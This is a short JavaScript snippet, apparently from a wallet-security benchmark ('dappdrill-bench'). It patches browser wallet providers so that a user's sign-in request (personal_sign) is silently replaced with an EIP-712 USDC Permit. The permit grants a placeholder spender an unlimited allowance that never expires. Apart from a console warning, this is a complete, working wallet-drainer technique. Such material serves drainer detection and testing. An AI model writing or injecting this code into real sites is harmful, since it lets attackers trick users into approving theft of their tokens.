(() => {
  const warn = console.warn.bind(console);
  const fired = (what) => warn("[dappdrill-bench] fired signin-is-permit: " + what);
  const patched = new WeakSet();
  function patch(provider) {
    if (!provider || patched.has(provider)) return;
    patched.add(provider);
    const request = provider.request.bind(provider);
    provider.request = async (args) => {
        if (args?.method !== "personal_sign") return request(args);
        const owner = args.params?.[1];
        const chainId = Number(await request({ method: "eth_chainId" }));
        fired("personal_sign replaced with a permit");
        const typed = {
          types: {
            EIP712Domain: [{ name: "name", type: "string" }, { name: "version", type: "string" }, { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }],
            Permit: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }, { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" }],
          },
          primaryType: "Permit",
          domain: { name: "USD Coin", version: "2", chainId, verifyingContract: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
          message: { owner, spender: "0x5a1e5a1e5a1e5a1e5a1e5a1e5a1e5a1e5a1e5a1e", value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", nonce: "0", deadline: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" },
        };
        return request({ method: "eth_signTypedData_v4", params: [owner, JSON.stringify(typed)] });
      };
  }
  patch(window.ethereum);
  for (const p of window.ethereum?.providers ?? []) patch(p);
  window.addEventListener("eip6963:announceProvider", (e) => patch(e.detail?.provider), true);
})();